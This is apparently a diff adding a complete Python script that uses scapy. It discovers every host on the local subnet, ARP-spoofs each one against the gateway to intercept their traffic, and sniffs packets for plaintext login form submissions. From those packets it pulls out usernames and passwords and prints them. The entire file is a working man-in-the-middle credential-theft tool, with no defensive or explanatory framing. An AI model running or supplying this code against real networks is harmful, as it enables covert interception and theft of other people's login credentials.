@@ -1,0 +1,72 @@
+#!/usr/bin/env python
+from scapy.layers.http import *
+import os,re,time
+import scapy.all as scapy
+import netifaces,netfilterqueue
+
+def process_packet(packet):
+	print(packet)
+	packet.accept()
+
+
+def get_mac(ip):
+    arp_request = scapy.ARP(pdst=ip)
+    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
+    arp_request_broadcast = broadcast / arp_request
+    answered_list = scapy.srp(arp_request_broadcast,
+                              timeout=1, verbose=False)[0]
+    return (answered_list[0][1].hwsrc)
+
+
+def spoof(target_ip, spoof_ip):
+    target_mac = get_mac(target_ip)
+    packet = scapy.ARP(op=2, pdst=target_ip,
+                       hwdst=target_mac,
+                       psrc=spoof_ip)
+    scapy.send(packet, verbose=False)
+
+
+def fetch_pkt(pkt):
+    data = str(pkt)
+    pattern = re.compile(r'usr=.*&pwd=.*&btn_login=Login')
+    result = re.findall(pattern,data)
+    if result:
+        for res in result:
+            username = res.split('&')[0][4:]
+            password = res.split('&')[1][4:]
+        print(username + " " + password)
+def restore(destination_ip, source_ip):
+
+    destination_mac = get_mac(destination_ip)
+    source_mac = get_mac(source_ip)
+    packet = scapy.ARP(op=2, pdst=destination_ip,
+                       hwdst=destination_mac,
+                       psrc=source_ip, hwsrc=source_mac)
+
+    scapy.send(packet, count=4, verbose=False)
+
+gateway_ip = str(netifaces.gateways()['default'][netifaces.AF_INET][0])
+gateway_mac = get_mac(gateway_ip)
+answered_list = scapy.arping(gateway_ip+"/24", verbose = 0)[0]
+maclist = []
+iplist = []
+for element in answered_list:
+	iplist.append(element[1].psrc)
+	maclist.append(element[1].hwsrc)
+
+print("IP\t\t\tMAC Address\n-----------------------------------------")
+for x, y in zip(iplist,maclist):
+    	if(y!=gateway_mac):
+        	print(x + "\t\t" + y)
+
+try:
+    while True:
+        for ip in iplist:
+            spoof(ip, gateway_ip)
+            spoof(gateway_ip, ip)
+        scapy.sniff(prn = fetch_pkt, store = 0)
+        time.sleep(1)
+except KeyboardInterrupt:
+    for ip in iplist:
+        restore(ip, gateway_ip)
+        restore(gateway_ip, ip)
